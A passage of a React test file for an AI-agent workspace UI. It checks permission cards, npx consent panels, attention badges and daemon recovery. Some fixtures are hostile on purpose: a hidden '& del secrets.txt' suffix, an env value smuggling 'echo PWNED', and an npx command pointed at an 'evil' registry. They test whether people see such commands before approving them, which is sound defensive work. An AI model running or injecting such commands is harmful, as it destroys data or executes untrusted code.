    expect(surface.contains(card)).toBe(true);
    const conversation = card.closest(".workspace-conversation");
    expect(conversation).not.toBeNull();
    expect(conversation?.lastElementChild).toBe(card);
    const composer = container.querySelector('[data-testid="mock-composer"]');
    if (composer === null) throw new Error("composer did not render");
    expect(conversation?.compareDocumentPosition(composer)).toBe(Node.DOCUMENT_POSITION_FOLLOWING);
  });

  it("renders the description in its own compact class", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{ ...permissionRequest, description: "This will run the tests" }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    expect(container.querySelector(".permission-card-description")?.textContent).toBe(
      "This will run the tests",
    );
  });

  it("disables permission outcomes that the request did not offer", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{
            ...permissionRequest,
            options: [{ optionId: "allow", name: "Allow once", kind: "allow_once" }],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const deny = container.querySelector<HTMLButtonElement>(".permission-card-deny-action");
    const allow = container.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (deny === null || allow === null) throw new Error("permission controls did not render");
    expect(deny.disabled).toBe(true);
    expect(allow.disabled).toBe(false);
    expect(container.textContent).toContain("Deny is not offered for this request.");
    await act(async () => deny.click());
    expect(sessionPermissionRespond).not.toHaveBeenCalled();

    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{
            ...permissionRequest,
            toolCallId: "tool-reject-only",
            options: [{ optionId: "deny", name: "Deny", kind: "reject_once" }],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });
    const rejectOnlyAllow = container.querySelector<HTMLButtonElement>(
      ".permission-card-primary-action",
    );
    if (rejectOnlyAllow === null) throw new Error("permission allow control did not render");
    expect(rejectOnlyAllow.disabled).toBe(true);
    expect(container.textContent).toContain("Allow once is not offered for this request.");
  });

  it("shows the command, args, and cwd that will be spawned", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={spawnPermissionRequest}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const text = container.textContent ?? "";
    expect(text).toContain("cmd.exe");
    expect(text).toContain("/c");
    expect(text).toContain("echo");
    expect(text).toContain("gated");
    expect(text).toContain("C:\\work\\tree");
  });

  it("shows permission requests FIFO and advances after a response", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    await act(async () => undefined);

    const emitA = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    const emitB = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-b]");
    if (emitA === null || emitB === null) throw new Error("permission emitters did not render");
    await act(async () => emitA.click());
    await act(async () => emitB.click());

    const card = container.querySelector(".permission-card");
    if (card === null) throw new Error("permission card did not render");
    expect(card.textContent).toContain("cmd.exe");
    expect(card.textContent).toContain("alpha");
    expect(card.textContent).not.toContain("ping.exe");

    const allow = container.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => allow.click());
    await act(async () => undefined);

    const next = container.querySelector(".permission-card");
    if (next === null) throw new Error("second permission card did not render");
    expect(next.textContent).toContain("ping.exe");
    expect(next.textContent).toContain("C:\\beta");
    expect(sessionPermissionRespond).toHaveBeenCalledWith("session-2", 41, "tool-a", "allow_once");
  });

  it("adopts the fresh subscription id when the same request is re-emitted after a remount", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    await act(async () => undefined);

    const emitA = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    const emitRenewed = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-a-renewed]",
    );
    if (emitA === null || emitRenewed === null)
      throw new Error("permission emitters did not render");
    await act(async () => emitA.click());
    await act(async () => emitRenewed.click());

    const allow = container.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => allow.click());
    await act(async () => undefined);

    // The first emit queued subscription 41; the surface then remounted and
    // re-attached with subscription 42. The queued card must respond with 42.
    expect(sessionPermissionRespond).toHaveBeenCalledTimes(1);
    expect(sessionPermissionRespond).toHaveBeenCalledWith("session-2", 42, "tool-a", "allow_once");
  });

  it("quotes args that contain spaces so they are not split visually", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{
            ...spawnPermissionRequest,
            args: ["hello world"],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const command = container.querySelector(".permission-card-command")?.textContent ?? "";
    expect(command).toContain('"hello world"');
    expect(command).not.toBe("cmd.exe hello world");
  });

  it("shows the selected session's permission when another session's request is at the head", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      acpSession("session-a", "agent a"),
      acpSession("session-b", "agent b"),
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const emitA = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    if (emitA === null) throw new Error("permission emitter A did not render");
    await act(async () => emitA.click());
    expect(container.querySelector(".permission-card")?.textContent).toContain("alpha");

    const tabB = [...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab")].find(
      (tab) => tab.textContent?.includes("agent b"),
    );
    if (tabB === undefined) throw new Error("session B tab did not render");
    await act(async () => tabB.click());
    await act(async () => undefined);

    const emitB = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-b]");
    if (emitB === null) throw new Error("permission emitter B did not render");
    await act(async () => emitB.click());

    const card = container.querySelector(".permission-card");
    if (card === null) throw new Error("selected session B's permission card did not render");
    expect(card.textContent).toContain("ping.exe");
    expect(card.textContent).not.toContain("alpha");
  });

  it("shows the full command including a long suffix the user must see before allowing", async () => {
    const suffix = "& del secrets.txt";
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{
            ...spawnPermissionRequest,
            command: `${"echo ".padEnd(2100, "x")}${suffix}`,
            args: undefined,
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    expect(container.textContent).toContain(suffix);
    expect(container.textContent).not.toContain("…");
  });

  it("lists env name=value on the permission card when present", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{
            ...spawnPermissionRequest,
            env: [{ name: "DB_GATE", value: "SAFE & echo PWNED" }],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const env = container.querySelector(".permission-card-env")?.textContent ?? "";
    expect(env).toContain("DB_GATE=SAFE & echo PWNED");
  });

  it("keeps a card the backend resolved without a UI click, unnamed — it does not vanish as if you answered", async () => {
    // Rewritten by the fix pass. The old test pinned the deletion: a
    // resolution with no `answeredBy` removed the card as if a person had
    // answered it. The wire's silence is not a person — the card stays,
    // unnamed, and only the human's Clear removes it.
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    await act(async () => undefined);

    const emit = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    const resolved = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-resolved]",
    );
    if (emit === null || resolved === null) throw new Error("permission emitters did not render");
    await act(async () => emit.click());
    expect(container.querySelector(".permission-card")).not.toBeNull();

    await act(async () => resolved.click());
    const card = container.querySelector(".permission-card");
    expect(card).not.toBeNull();
    expect(card?.querySelector(".permission-card-label")?.textContent).toBe(
      "Answered — by whom and with what outcome, the daemon did not say",
    );
    expect(sessionPermissionRespond).not.toHaveBeenCalled();
  });

  it("surfaces a waiting card behind a resolved one instead of hiding it (re-audit F6)", async () => {
    // Two cards queued for one session; the head is resolved from outside.
    // The head-find handed the panel's slot to the RESOLVED card — whose
    // only control is Clear — so the waiting card's Allow/Deny were
    // unreachable and nothing said a second card existed. The slot belongs
    // to the card that needs the human; the resolved one keeps its place
    // behind it and takes the slot back once the waiting one is answered.
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    await act(async () => undefined);

    const emitA = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    const emitB = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-b]");
    if (emitA === null || emitB === null) throw new Error("permission emitters did not render");
    await act(async () => emitA.click());
    await act(async () => emitB.click());
    expect(container.querySelector(".permission-card")?.textContent).toContain("cmd.exe");

    const resolved = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-resolved]",
    );
    if (resolved === null) throw new Error("resolved emitter did not render");
    await act(async () => resolved.click());

    const waiting = container.querySelector(".permission-card");
    if (waiting === null) throw new Error("waiting card did not render behind the resolved one");
    expect(waiting.textContent).toContain("ping.exe");
    expect(waiting.textContent).not.toContain("cmd.exe");
    const allow = waiting.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (allow === null) throw new Error("waiting card's allow control did not render");
    expect(allow.disabled).toBe(false);

    // Answering B hands the slot back to the resolved A: it never vanished,
    // and Clear — not Allow — is its control now.
    await act(async () => allow.click());
    await act(async () => undefined);
    const answered = container.querySelector(".permission-card");
    expect(answered).not.toBeNull();
    expect(answered?.textContent).toContain("cmd.exe");
    expect(answered?.querySelector(".permission-card-label")?.textContent).toBe(
      "Answered — by whom and with what outcome, the daemon did not say",
    );
    expect(answered?.querySelector(".permission-card-dismiss-action")?.textContent).toBe("Clear");
    expect(answered?.querySelector(".permission-card-primary-action")).toBeNull();
  });

  it("keeps the other session's card when two sessions share a toolCallId", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      acpSession("session-a", "agent a"),
      acpSession("session-b", "agent b"),
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const emitShared = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-shared]",
    );
    if (emitShared === null) throw new Error("shared permission emitter did not render");
    await act(async () => emitShared.click());
    expect(container.querySelector(".permission-card")?.textContent).toContain("shared-session-a");

    const tabB = [...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab")].find(
      (tab) => tab.textContent?.includes("agent b"),
    );
    if (tabB === undefined) throw new Error("session B tab did not render");
    await act(async () => tabB.click());
    await act(async () => undefined);

    const emitB = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-shared]",
    );
    if (emitB === null) throw new Error("session B shared emitter did not render");
    await act(async () => emitB.click());
    expect(container.querySelector(".permission-card")?.textContent).toContain("shared-session-b");

    const tabA = [...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab")].find(
      (tab) => tab.textContent?.includes("agent a"),
    );
    if (tabA === undefined) throw new Error("session A tab did not render");
    await act(async () => tabA.click());
    await act(async () => undefined);

    const allow = container.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => allow.click());
    await act(async () => undefined);

    expect(container.querySelector(".permission-card")).toBeNull();
    expect(sessionPermissionRespond).toHaveBeenCalledWith(
      "session-a",
      41,
      "shared-tool",
      "allow_once",
    );

    await act(async () => tabB.click());
    await act(async () => undefined);
    const cardB = container.querySelector(".permission-card");
    if (cardB === null) throw new Error("session B's card vanished after resolving A");
    expect(cardB.textContent).toContain("shared-session-b");
    expect(cardB.textContent).not.toContain("shared-session-a");
    expect(
      cardB.querySelector<HTMLButtonElement>(".permission-card-primary-action")?.disabled,
    ).toBe(false);
  });

  it("shows consent panel when picking an npx provider and does not call create", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);
    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
    expect(document.body.textContent).toContain("@agentclientprotocol/codex-acp@1.10.0");
    expect(document.body.textContent).toContain(
      "npx -y @agentclientprotocol/codex-acp@1.10.0 --registry=https://evil",
    );
    expect(document.body.textContent).toContain("npx will download and run third-party code");
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("names the command and the download in Confirm's accessible description", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    // Focus lands on Confirm when the card opens, so its description is the
    // whole of what a screen-reader user hears before approving a package
    // download. Resolve the ids to their TEXT rather than asserting the
    // attribute exists: the spoken words are the thing under test, and an
    // aria-describedby pointing at a missing or empty node announces nothing
    // while still satisfying an attribute check.
    const confirm = Array.from(document.querySelectorAll<HTMLButtonElement>("button")).find(
      (button) => button.textContent?.trim() === "Confirm",
    );
    if (confirm === undefined) throw new Error("Confirm did not render");
    expect(document.activeElement).toBe(confirm);

    const described = (confirm.getAttribute("aria-describedby") ?? "")
      .split(/\s+/)
      .filter((id) => id.length > 0)
      .map((id) => document.querySelector(`#${id}`)?.textContent ?? "")
      .join(" ");

    expect(described).toContain(
      "npx -y @agentclientprotocol/codex-acp@1.10.0 --registry=https://evil",
    );
    expect(described).toContain("download and run third-party code");
  });

  it("Confirm on consent panel calls create exactly once", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-codex", "Agent"),
      kind: "acp",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    const confirm = document.querySelector<HTMLButtonElement>(".workspace-primary-action");
    if (confirm === null) throw new Error("Confirm button did not render");
    await act(async () => confirm.click());
    await act(async () => undefined);

    expect(sessionCreate).toHaveBeenCalledTimes(1);
    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp", "codex-acp");
    expect(document.querySelector('[aria-label="Confirm agent"]')).toBeNull();
    expect(document.querySelector('[aria-label="Choose agent"]')).toBeNull();
  });

  it("Cancel on consent panel returns to option list without creating", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
    const cancel = Array.from(
      document.querySelectorAll<HTMLButtonElement>(".workspace-secondary-action"),
    ).find((button) => button.textContent === "Cancel");
    if (cancel === undefined) throw new Error("Cancel button did not render");
    await act(async () => cancel.click());
    await act(async () => undefined);

    expect(document.querySelector('[aria-label="Confirm agent"]')).toBeNull();
    expect(document.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("Escape on consent panel returns to option list without creating", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();

    await act(async () => {
      window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
    });

    expect(document.querySelector('[aria-label="Confirm agent"]')).toBeNull();
    expect(document.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("double-click on Confirm creates only once", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-codex", "Agent"),
      kind: "acp",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    const confirm = document.querySelector<HTMLButtonElement>(".workspace-primary-action");
    if (confirm === null) throw new Error("Confirm button did not render");
    const rowsBefore = container.querySelectorAll(".workspace-row").length;
    await act(async () => {
      confirm.click();
      confirm.click();
    });
    await act(async () => undefined);

    expect(sessionCreate).toHaveBeenCalledTimes(1);
    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp", "codex-acp");
    // Reuse, not mint: the row count is unchanged.
    expect(container.querySelectorAll(".workspace-row").length).toBe(rowsBefore);
  });

  describe("session attention badges", () => {
    const attentionSession = (
      id: string,
      title: string,
      reason: "finished" | "error" | "permission",
    ): Session => ({
      ...acpSession(id, title),
      attention: { reason, atMs: 1_000 },
    });

    it("renders an attention badge on tabs that carry attention and none on tabs without", async () => {
      vi.mocked(sessionsList).mockResolvedValue([
        attentionSession("session-a", "agent finished", "finished"),
        attentionSession("session-b", "agent error", "error"),
        attentionSession("session-c", "agent permission", "permission"),
        acpSession("session-d", "agent quiet"),
      ]);
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      const findTab = (title: string): HTMLButtonElement => {
        const tab = [
          ...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab"),
        ].find((candidate) => candidate.textContent?.includes(title));
        if (tab === undefined) throw new Error(`tab for ${title} did not render`);
        return tab;
      };

      expect(findTab("agent finished").querySelector(".workspace-tab-attention")?.textContent).toBe(
        "finished",
      );
      expect(findTab("agent error").querySelector(".workspace-tab-attention")?.textContent).toBe(
        "error",
      );
      expect(
        findTab("agent permission").querySelector(".workspace-tab-attention")?.textContent,
      ).toBe("needs approval");
      const quiet = findTab("agent quiet");
      expect(quiet.querySelector(".workspace-tab-attention")).toBeNull();
    });

    it("says the reason in the tab's accessible name, not only by colour", async () => {
      vi.mocked(sessionsList).mockResolvedValue([
        attentionSession("session-a", "agent blocked", "permission"),
      ]);
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      const tab = [...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab")][0];
      if (tab === undefined) throw new Error("attention tab did not render");
      // The tab has no aria-label override, so its accessible name is built
      // from its text content — which must carry the reason, not just a colour.
      expect(tab.getAttribute("aria-label")).toBeNull();
      expect(tab.textContent).toContain("agent blocked");
      expect(tab.textContent).toContain("needs approval");
    });
  });

  describe("daemon unresponsive recovery", () => {
    const UNRESPONSIVE_MESSAGE = "the daemon stopped answering";

    beforeEach(() => {
      vi.mocked(daemonStatus).mockResolvedValue({
        state: "unresponsive",
        pid: 42,
        instanceId: "daemon-test",
        protocolVersion: 1,
        clients: 1,
        capabilities: ["typed_permissions"],
        message: UNRESPONSIVE_MESSAGE,
      });
    });

    it("shows the daemon's unresponsive sentence verbatim in the status strip", async () => {
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      const strip = container.querySelector(".workspace-daemon-status");
      if (strip === null) throw new Error("daemon status strip did not render");
      expect(strip.textContent).toContain("Daemon");
      expect(strip.getAttribute("title")).toContain(UNRESPONSIVE_MESSAGE);
    });

    it("asks once when a session is live, and a decline keeps the state visible without restarting", async () => {
      vi.mocked(ask).mockResolvedValue(false);
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      // The default roster has one live terminal session, so the destructive
      // restart must not happen on its own.
      expect(daemonRestart).not.toHaveBeenCalled();
      expect(ask).toHaveBeenCalledTimes(1);
      const message = String(vi.mocked(ask).mock.calls[0]?.[0]);
      expect(message).toContain("stop");
      expect(message).toContain("conversations are kept");

      // The state stays visible after the decline: the dot turns and the
      // sentence rides in the tooltip.
      const strip = container.querySelector(".workspace-daemon-status");
      if (strip === null) throw new Error("daemon status strip did not render");
      expect(strip.textContent).toContain("Daemon");
      expect(strip.getAttribute("title")).toContain(UNRESPONSIVE_MESSAGE);
    });

    it("restarts without asking when no session is live", async () => {
      vi.mocked(sessionsList).mockResolvedValue([]);
      vi.mocked(ask).mockResolvedValue(true);
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      expect(daemonRestart).toHaveBeenCalledTimes(1);
      expect(ask).not.toHaveBeenCalled();
    });

    it("says a restart attempt did not complete when the command rejects", async () => {
      vi.mocked(sessionsList).mockResolvedValue([]);
      vi.mocked(daemonRestart).mockRejectedValue(new Error("daemon identity changed"));
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      const strip = container.querySelector(".workspace-daemon-status");
      if (strip === null) throw new Error("daemon status strip did not render");
      // Both facts at once, in the tooltip: the daemon's own sentence and the
      // failed attempt.
      const tooltip = strip.getAttribute("title") ?? "";
      expect(tooltip).toContain(UNRESPONSIVE_MESSAGE);
      expect(tooltip).toContain("a restart was attempted, but it did not complete");
    });
  });

  it("shows no origin badge on a local session's tab", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      { ...terminal("local-session", "shell one"), origin: { kind: "local" } },
    ]);
    const devicesRead = deferred<DevicesReply>();
    vi.mocked(devicesList).mockReturnValue(devicesRead.promise);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await vi.waitFor(() => {
      expect(container.querySelector(".workspace-session-tab")).not.toBeNull();
      expect(devicesList).toHaveBeenCalledTimes(1);
    });
    // Assert after the device read has landed, so "no badge" says something
    // about a local session rather than about a map that has not arrived yet.
    await act(async () => {
      devicesRead.resolve(devicesReply);
    });

    const tab = container.querySelector(".workspace-session-tab");
    if (tab === null) throw new Error("session tab did not render");
    expect(tab.querySelector(".workspace-session-origin-badge")).toBeNull();
  });

  it("marks an unknown origin on the tab of a session the daemon did not describe", async () => {
    // The default fixture carries no origin, which is what an older daemon
    // sends: the tab says so instead of reading as a local session.
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });

    const badge = await vi.waitFor(() => {
      const found = container.querySelector<HTMLElement>(
        ".workspace-session-tab .workspace-session-origin-badge",
      );
      if (found === null) throw new Error("origin badge did not render");
      expect(found.textContent).toBe("origin unknown");
      return found;
    });
    // The full text survives the tab's truncation, which CSS does.
    expect(badge.title).toBe("origin unknown");
    // Its own class beside the peer pill's, so the two are never one element.
    expect(badge.className).toBe(
      "workspace-session-origin-badge workspace-session-origin-badge-unknown",
    );
    // And never the peer badge's wording.
    expect(badge.textContent).not.toContain("from ");
  });

  it("marks an unknown origin on the tab of a session the daemon could not place", async () => {
    // The daemon stamps `unknown` on a journal row whose origin column it could
    // not interpret. That is not a local session: the tab gets the same badge
    // and the same pill an absent origin gets, and never the peer pill.
    vi.mocked(sessionsList).mockResolvedValue([
      { ...terminal("unplaced-session", "remote shell"), origin: { kind: "unknown" } },
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });

    const badge = await vi.waitFor(() => {
      const found = container.querySelector<HTMLElement>(
        ".workspace-session-tab .workspace-session-origin-badge",
      );
      if (found === null) throw new Error("origin badge did not render");
      expect(found.textContent).toBe("origin unknown");
      return found;
    });
    expect(badge.title).toBe("origin unknown");
    expect(badge.className).toBe(
      "workspace-session-origin-badge workspace-session-origin-badge-unknown",
    );
    expect(badge.textContent).not.toContain("from ");
  });

  it("names the device on a peer session's tab", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      {
        ...terminal("peer-session", "remote shell"),
        origin: { kind: "peer", deviceId: "device-phone", role: "client" },
      },
    ]);
    const devicesRead = deferred<DevicesReply>();
    vi.mocked(devicesList).mockReturnValue(devicesRead.promise);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await vi.waitFor(() => {
      expect(container.querySelector(".workspace-session-tab")).not.toBeNull();
      expect(devicesList).toHaveBeenCalledTimes(1);
    });
    await act(async () => {
      devicesRead.resolve(devicesReply);
    });

    const badge = container.querySelector<HTMLElement>(
      ".workspace-session-tab .workspace-session-origin-badge",
    );
    expect(badge?.textContent).toBe("from Xiaomi 14");
    // The full text survives the tab's truncation, which CSS does.
    expect(badge?.title).toBe("from Xiaomi 14");
  });

  it("keeps the peer badge on a tab whose peer origin names no device", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      {
        ...terminal("peer-guard-session", "remote shell"),
        origin: { kind: "peer", role: "daemon" },
      },
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });

    const badge = await vi.waitFor(() => {
      const found = container.querySelector<HTMLElement>(
        ".workspace-session-tab .workspace-session-origin-badge",
      );
      if (found === null) throw new Error("origin badge did not render");
      expect(found.textContent).toBe("from unknown");
      return found;
    });
    // Still the peer pill, not the one an absent origin gets: a peer whose
    // device is unknown is still a named peer.
    expect(badge.className).toBe("workspace-session-origin-badge");
    expect(badge.title).toBe("from unknown");
  });

  it("falls back to the device id for a device the list does not know", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      {
        ...terminal("peer-session", "remote shell"),
        origin: { kind: "peer", deviceId: "device-unseen", role: "daemon" },
      },
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });

    // Poll the DOM instead of guessing how many ticks React needs: the badge is
    // there exactly when the devices read has been applied.
    await vi.waitFor(() => {
      expect(
        container.querySelector(".workspace-session-tab .workspace-session-origin-badge")
          ?.textContent,
      ).toBe("from device-unseen");
    });
  });

  it("names a created child's creator on the child's tab", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      { ...acpSession("creator-session", "design run"), displayName: "Design runner" },
      {
        ...acpSession("child-session", "worker"),
        displayName: "worker one",
        createdBy: "creator-session",
      },
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });

    const tab = await vi.waitFor(() => {
      const found = container.querySelector<HTMLElement>("#workspace-session-tab-child-session");
      if (found === null) throw new Error("created child's tab did not render");
      return found;
    });

    // The session's own name is the tab's label; the creator is its own pill
    // beside it, never part of that text.
    expect(tab.querySelector(".workspace-tab-label")?.textContent).toBe("worker one");
    const pills = [...tab.querySelectorAll<HTMLElement>(".workspace-session-origin-badge")];
    const creatorPill = pills.find((pill) => pill.textContent === "created by Design runner");
    expect(creatorPill).not.toBeUndefined();
    // Same pill as the peer device's: one class, no second badge style.
    expect(creatorPill?.className).toBe("workspace-session-origin-badge");
    // The full text survives the tab's truncation, which CSS does.
    expect(creatorPill?.title).toBe("created by Design runner");
